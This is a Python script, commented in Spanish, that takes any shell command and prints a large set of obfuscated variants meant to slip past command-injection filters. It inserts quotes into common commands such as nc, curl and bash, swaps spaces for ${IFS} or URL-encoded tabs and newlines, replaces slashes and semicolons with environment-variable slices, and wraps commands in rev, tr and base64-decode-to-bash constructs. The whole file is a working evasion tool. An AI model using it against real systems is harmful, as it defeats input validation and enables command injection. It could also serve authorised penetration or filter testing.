import random
import base64


def obfuscate_common_commands(command: str):
    """Añade comillas simples a un carácter aleatorio en comandos comunes."""
    common_commands = [
        'ls', 'id', 'cat', 'echo', 'whoami', 'pwd', 'ps', 'grep', 'find',
        'chmod', 'chown', 'cp', 'mv', 'rm', 'mkdir', 'rmdir', 'touch',
        'head', 'tail', 'less', 'more', 'wc', 'sort', 'uniq', 'cut',
        'awk', 'sed', 'wget', 'curl', 'nc', 'netcat', 'bash', 'sh'
    ]
    command_parts = command.split(';')
    processed_parts = []
    for part in command_parts:
        words = part.strip().split()
        if not words: continue
        obfuscated_words = []
        cmd_to_obfuscate = words[0]
        if cmd_to_obfuscate.lower() in common_commands and len(cmd_to_obfuscate) > 1:
            pos = random.randint(0, len(cmd_to_obfuscate) - 1)
            obfuscated_cmd = f"{cmd_to_obfuscate[:pos]}'{cmd_to_obfuscate[pos]}'{cmd_to_obfuscate[pos + 1:]}"
            obfuscated_words.append(obfuscated_cmd)
            obfuscated_words.extend(words[1:])
        else:
            obfuscated_words.extend(words)
        processed_parts.append(" ".join(obfuscated_words))
    return ";".join(processed_parts)


def get_space_variations(command: str):
    """Devuelve una lista de comandos con diferentes reemplazos de espacio."""
    brace_variant = "{" + ",".join(command.split()) + "}" if ";" not in command else None
    variations = [
        command.replace(" ", "%09"),
        command.replace(" ", "${IFS}"),
        command.replace(" ", "%0a"),
    ]
    if brace_variant:
        variations.append(brace_variant)
    return variations


def replace_slash(command: str):
    """Reemplaza / en un solo comando."""
    return command.replace('/', "${PATH:0:1}")


def replace_semicolon(command:str):
    """Reemplaza ; en un solo comando."""
    return command.replace(";", "${LS_COLORS:10:1}")


def randomize_case(command: str):
    """Aplica mayúsculas y minúsculas de forma aleatoria a un comando."""
    return "".join(
        char.upper() if random.choice([True, False]) else char.lower()
        for char in command
    )


def wrap_with_tr(command: str):
    """Envuelve un comando en la construcción $(tr ... <<< "...")."""
    escaped_command = command.replace('"', '\\"')
    return f'$(tr "[A-Z]" "[a-z]"<<<"{escaped_command}")'


def wrap_with_rev(command: str):
    """Invierte un comando y lo envuelve en la construcción $(rev<<<...)."""
    reversed_command = command[::-1]
    return f"$(rev<<<'{reversed_command}')"


def wrap_with_base64(command: str):
    """Encodes a command in Base64 and wraps it for execution."""
    encoded_payload = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    return f"bash<<<$(base64 -d<<<{encoded_payload})"


def apply_final_space_variations(payloads: set) -> set:
    """Aplica variaciones de espacio a la lista final de payloads."""
    final_set = set()
    for p in payloads:
        final_set.add(p)  # Conservar el original
        if " " in p:
            final_set.add(p.replace(" ", "${IFS}"))
            final_set.add(p.replace(" ", "%09"))
            final_set.add(p.replace(" ", "%0a"))
    return final_set


def encode(command: str):
    """Genera una matriz de payloads combinando diferentes técnicas."""
    all_payloads = set()

    # 1. Comando base con ofuscación de comillas
    base_cmd = obfuscate_common_commands(command)

    # 2. Lista de comandos base para procesar (con variaciones de espacios iniciales)
    cmds_to_process = [base_cmd] + get_space_variations(base_cmd)

    # 3. Generar ofuscaciones base (/, ;)
    base_obfuscations = set()
    for cmd in cmds_to_process:
        base_obfuscations.add(cmd)
        base_obfuscations.add(replace_slash(cmd))
        base_obfuscations.add(replace_semicolon(cmd))
        base_obfuscations.add(replace_semicolon(replace_slash(cmd)))
    all_payloads.update(base_obfuscations)

    # 4. Añadir variaciones con $(rev...)
    rev_wrapped_payloads = {wrap_with_rev(p) for p in base_obfuscations}
    all_payloads.update(rev_wrapped_payloads)

    # 5. Añadir variaciones con base64
    base64_payloads = {wrap_with_base64(p) for p in base_obfuscations}
    all_payloads.update(base64_payloads)

    # 6. Añadir variaciones con mayúsculas/minúsculas aleatorias
    case_randomized_payloads = {randomize_case(p) for p in base_obfuscations}
    all_payloads.update(case_randomized_payloads)

    # 7. Envolver los payloads con mayúsculas en $(tr ...)
    tr_wrapped_payloads = {wrap_with_tr(p) for p in case_randomized_payloads}
    all_payloads.update(tr_wrapped_payloads)

    # 8. Crear variantes con bash<<< para todos los $(...)
    bash_wrapped_payloads = {f"bash<<<{p}" for p in all_payloads if p.startswith("$(")}
    all_payloads.update(bash_wrapped_payloads)

    # 9. PASO FINAL: Re-aplicar variaciones de espacio a todo lo generado
    all_payloads = apply_final_space_variations(all_payloads)

    # 10. Imprimir todos los payloads generados
    print(f"--- {len(all_payloads)} variaciones generadas ---")
    # ... (avisos) ...
    for i, payload in enumerate(sorted(list(all_payloads)), 1):
        print(f"{payload}")

    return list(all_payloads)


# --- Ejecución ---
command = input("Enter your command: ")
encode(command)